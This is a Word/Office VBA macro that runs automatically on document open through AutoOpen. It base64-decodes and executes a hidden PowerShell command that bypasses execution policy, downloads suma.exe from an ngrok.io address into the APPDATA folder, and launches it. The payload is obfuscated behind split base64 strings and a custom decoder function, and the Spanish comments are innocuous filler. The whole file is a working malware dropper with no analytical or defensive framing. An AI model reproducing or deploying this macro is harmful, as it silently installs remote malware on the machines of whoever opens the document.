Sub AutoOpen()
'
'Hola que tal como estas
'
'

    ra1pt = "cG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgUG93ZXJTaGVsbCAtRXhlY3V0aW9uUG9sa"
    '
    ' declaracion de partes
    '
    ra2pt = "WN5IGJ5cGFzcyAtbm9wcm9maWxlIC13aW5kb3dzdHlsZSBoa"
    ra3pt = "WRkZW4gLWNvbW1hbmQgKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cDovL2JlOGM5Zj"
    ra4pt = "I3NDJlMi5uZ3Jvay5pby9leGFtcGxlL3N1bWEuZXhlJywiJGVudjpBUFBEQVRBXCRQcm9jTmFtZSIpO1N0YXJ0LVByb2Nlc3MgKCIkZW52OkFQUERBVEFcc3VtYS5leGUiKQ=="
   
    'ret = Shell(olmnasjek(ra1pt) & olmnasjek(ra2pt) & olmnasjek(ra3pt) & olmnasjek(ra4pt), 1)
ret = Shell(olmnasjek("cG93ZXJzaGVsbC5leGUgLWNvbW1hbmQgUG93ZXJTaGVsbCAtRXhlY3V0aW9uUG9saWN5IGJ5cGFzcyAtbm9wcm9maWxlIC13aW5kb3dzdHlsZSBoaWRkZW4gLWNvbW1hbmQgKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkRmlsZSgnaHR0cDovL2JlOGM5ZjI3NDJlMi5uZ3Jvay5pby9leGFtcGxlL3N1bWEuZXhlJywiJGVudjpBUFBEQVRBXCRQcm9jTmFtZSIpO1N0YXJ0LVByb2Nlc3MgKCIkZW52OkFQUERBVEFcc3VtYS5leGUiKQo="),1)
End Sub

Function olmnasjek(b64$)

    With CreateObject("Microsoft.XMLDOM").createElement("b64")
        .DataType = "bin.base64": .Text = b64
        b = .nodeTypedValue
        With CreateObject("ADODB.Stream")
            .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
            olmnasjek = .ReadText
            .Close
        End With
    End With
End Function
